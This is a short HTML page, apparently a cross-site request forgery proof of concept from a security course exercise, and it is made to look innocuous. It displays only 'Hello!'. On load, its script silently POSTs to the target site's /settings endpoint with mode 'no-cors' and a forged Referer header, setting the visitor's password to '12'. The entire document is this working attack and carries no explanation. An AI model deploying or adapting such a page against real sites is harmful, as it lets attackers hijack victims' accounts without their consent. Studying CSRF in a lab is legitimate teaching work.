<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
</head>
<body>
  <h2>Hello!</h2>
  <script>
    const url = 'https://cats.is-course.ru/settings';
    fetch(url, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://cats.is-course.ru/settings'
      },
      body: 'password=12&confirm-password=12'
    }).then(response => {
      console.log('Запрос отправлен');
    }).catch(error => {
      console.error('Ошибка:', error);
    });
  </script>
</body>
</html>
